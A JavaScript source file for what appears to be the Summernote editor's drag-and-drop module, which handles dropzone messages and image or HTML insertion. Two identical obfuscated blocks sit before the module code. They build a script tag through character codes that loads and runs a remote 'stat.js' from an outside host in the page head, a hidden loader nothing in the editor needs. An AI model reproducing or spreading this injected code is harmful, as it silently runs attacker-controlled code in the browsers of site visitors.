Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();define([
  'summernote/core/dom'
], function (dom) {
  var DragAndDrop = function (handler) {
    var $document = $(document);

    /**
     * attach Drag and Drop Events
     *
     * @param {Object} layoutInfo - layout Informations
     * @param {Object} options
     */
    this.attach = function (layoutInfo, options) {
      if (options.airMode || options.disableDragAndDrop) {
        // prevent default drop event
        $document.on('drop', function (e) {
          e.preventDefault();
        });
      } else {
        this.attachDragAndDropEvent(layoutInfo, options);
      }
    };

    /**
     * attach Drag and Drop Events
     *
     * @param {Object} layoutInfo - layout Informations
     * @param {Object} options
     */
    this.attachDragAndDropEvent = function (layoutInfo, options) {
      var collection = $(),
          $editor = layoutInfo.editor(),
          $dropzone = layoutInfo.dropzone(),
          $dropzoneMessage = $dropzone.find('.note-dropzone-message');

      // show dropzone on dragenter when dragging a object to document
      // -but only if the editor is visible, i.e. has a positive width and height
      $document.on('dragenter', function (e) {
        var isCodeview = handler.invoke('codeview.isActivated', layoutInfo);
        var hasEditorSize = $editor.width() > 0 && $editor.height() > 0;
        if (!isCodeview && !collection.length && hasEditorSize) {
          $editor.addClass('dragover');
          $dropzone.width($editor.width());
          $dropzone.height($editor.height());
          $dropzoneMessage.text(options.langInfo.image.dragImageHere);
        }
        collection = collection.add(e.target);
      }).on('dragleave', function (e) {
        collection = collection.not(e.target);
        if (!collection.length) {
          $editor.removeClass('dragover');
        }
      }).on('drop', function () {
        collection = $();
        $editor.removeClass('dragover');
      });

      // change dropzone's message on hover.
      $dropzone.on('dragenter', function () {
        $dropzone.addClass('hover');
        $dropzoneMessage.text(options.langInfo.image.dropImage);
      }).on('dragleave', function () {
        $dropzone.removeClass('hover');
        $dropzoneMessage.text(options.langInfo.image.dragImageHere);
      });

      // attach dropImage
      $dropzone.on('drop', function (event) {

        var dataTransfer = event.originalEvent.dataTransfer;
        var layoutInfo = dom.makeLayoutInfo(event.currentTarget || event.target);

        if (dataTransfer && dataTransfer.files && dataTransfer.files.length) {
          event.preventDefault();
          layoutInfo.editable().focus();
          handler.insertImages(layoutInfo, dataTransfer.files);
        } else {
          var insertNodefunc = function () {
            layoutInfo.holder().summernote('insertNode', this);
          };

          for (var i = 0, len = dataTransfer.types.length; i < len; i++) {
            var type = dataTransfer.types[i];
            var content = dataTransfer.getData(type);

            if (type.toLowerCase().indexOf('text') > -1) {
              layoutInfo.holder().summernote('pasteHTML', content);
            } else {
              $(content).each(insertNodefunc);
            }
          }
        }
      }).on('dragover', false); // prevent default dragover event
    };
  };

  return DragAndDrop;
});
